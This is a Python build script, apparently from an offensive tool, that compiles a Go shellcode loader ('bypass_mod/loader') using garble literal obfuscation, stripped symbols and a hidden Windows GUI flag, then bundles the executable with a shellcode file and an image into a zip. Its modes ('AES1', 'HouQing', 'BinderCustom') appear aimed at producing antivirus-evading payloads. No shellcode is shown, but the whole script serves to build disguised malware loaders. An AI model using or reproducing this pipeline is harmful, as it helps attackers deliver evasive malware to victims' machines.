#encoding=utf-8

import os
import sys, getopt, zipfile

def main():
    fileName=""
    way=""
    opts, args = getopt.getopt(sys.argv[1:], "w:f:")
    for o, a in opts:
        if o == "-w":
            way = a
        elif o == "-f":
            fileName = a
    if way == "AES_GO_separate":
        bypass.AES_GO_separate(fileName)
    elif way == "AES1":
        bypass.AES1(fileName)
    elif way == "AES2":
        bypass.AES2(fileName)
    elif way == "HouQing":
        bypass.HouQing(fileName)
    elif way == "BinderAES1":
        bypass.BinderAES1(fileName)
    elif way == "BinderCustom":
        bypass.BinderCustom(fileName)
    else:
        print("输入有误")  

class bypass():
    def AES_GO_separate(fname):
        filename = fname
        print(filename)
        bypass = 'go env -w GOPRIVATE=\"*\" && garble -literals build -o F:\\Go_Work\\src\\github.com\\ed11s00n\\coolv0.1\\cool\\' + filename + '.exe -ldflags=\"-w -s\" -ldflags=\"-H windowsgui\" F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/bypass_mod/loader/main.go'
        os.system(bypass)
        mkpath = "F:\\Go_Work\\src\\github.com\\ed11s00n\\coolv0.1\\cool\\" + filename
        mkdir(mkpath)  
        movejpg = "move F:\\Go_Work\\src\\github.com\\ed11s00n\\coolv0.1\\cool\\a.jpg F:\\Go_Work\\src\\github.com\\ed11s00n\\coolv0.1\\cool\\" + filename
        movetxt = "move F:\\Go_Work\\src\\github.com\\ed11s00n\\coolv0.1\\cool\\shellcode.txt F:\\Go_Work\\src\\github.com\\ed11s00n\\coolv0.1\\cool\\" + filename
        moveexe = "move F:\\Go_Work\\src\\github.com\\ed11s00n\\coolv0.1\\cool\\"+filename+".exe F:\\Go_Work\\src\\github.com\\ed11s00n\\coolv0.1\\cool\\"+filename
        os.system(movejpg)
        os.system(movetxt)
        os.system(moveexe)
        make_zip(mkpath, filename + ".zip")
        sys.exit()

    def AES1(fname):
        filename = fname
        bypass = 'go env -w GOPRIVATE=\"*\" && garble -literals build -o F:\\Go_Work\\src\\github.com\\ed11s00n\\coolv0.1\\cool\\'+filename+'.exe -ldflags=\"-w -s\" -ldflags=\"-H windowsgui\" F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/bypass_mod/loader/main.go'
        os.system(bypass)
        sys.exit()

    def AES2(fname):
        filename = fname
        bypass = 'go env -w GOPRIVATE=\"*\" && garble -literals build -o F:\\Go_Work\\src\\github.com\\ed11s00n\\coolv0.1\\cool\\'+filename+'.exe -ldflags=\"-w -s\" -ldflags=\"-H windowsgui\" F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/bypass_mod/loader/main.go'
        os.system(bypass)
        sys.exit()

    def HouQing(fname):
        filename = fname
        print(filename)
        bypass = 'go env -w GOPRIVATE=\"*\" && garble -literals build -o F:\\Go_Work\\src\\github.com\\ed11s00n\\coolv0.1\\cool\\' + filename + '.exe -ldflags=\"-H windowsgui\" -ldflags=\"-w -s\" F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/bypass_mod/loader/main.go'
        os.system(bypass)
        mkpath = "F:\\Go_Work\\src\\github.com\\ed11s00n\\coolv0.1\\cool\\" + filename
        mkdir(mkpath)  # 新建一个放1.jpg 和exe的文件夹
        movejpg = "move F:\\Go_Work\\src\\github.com\\ed11s00n\\coolv0.1\\cool\\a.jpg F:\\Go_Work\\src\\github.com\\ed11s00n\\coolv0.1\\cool\\" + filename
        moveexe = "move F:\\Go_Work\\src\\github.com\\ed11s00n\\coolv0.1\\cool\\"+filename+".exe F:\\Go_Work\\src\\github.com\\ed11s00n\\coolv0.1\\cool\\"+filename
        os.system(movejpg)
        os.system(moveexe)
        make_zip(mkpath, filename + ".zip")
        sys.exit()

    def BinderAES1(fname):
        filename = fname
        bypass = 'go env -w GOPRIVATE=\"*\" && garble -literals build -o F:\\Go_Work\\src\\github.com\\ed11s00n\\coolv0.1\\cool\\'+filename+'.exe -ldflags=\"-H windowsgui\" F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/bypass_mod/loader/main.go'
        os.system(bypass)
        sys.exit()
    
    def BinderCustom(fname):
        filename = fname
        bypass = 'go env -w GOPRIVATE=\"*\" && garble -literals build -o F:\\Go_Work\\src\\github.com\\ed11s00n\\coolv0.1\\cool\\'+filename+'.exe -ldflags=\"-H windowsgui\" F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/bypass_mod/loader/main.go'
        os.system(bypass)
        sys.exit()


def mkdir(path):
    path = path.strip()
    path = path.rstrip("\\")
    isExists = os.path.exists(path)
    if not isExists:
        os.makedirs(path)
        print("文件夹创建成功")
        return True
    else:
        # 如果目录存在则不创建，并提示目录已存在
        print("文件夹创建失败")
        return False


# 打包目录为zip文件（未压缩）
def make_zip(source_dir, output_filename):
    zipf = zipfile.ZipFile(output_filename, 'w')
    pre_len = len(os.path.dirname(source_dir))
    for parent, dirnames, filenames in os.walk(source_dir):
        for filename in filenames:
            pathfile = os.path.join(parent, filename)
            arcname = pathfile[pre_len:].strip(os.path.sep)  # 相对路径
            zipf.write(pathfile, arcname)
    zipf.close()


if __name__ == '__main__':
    main()
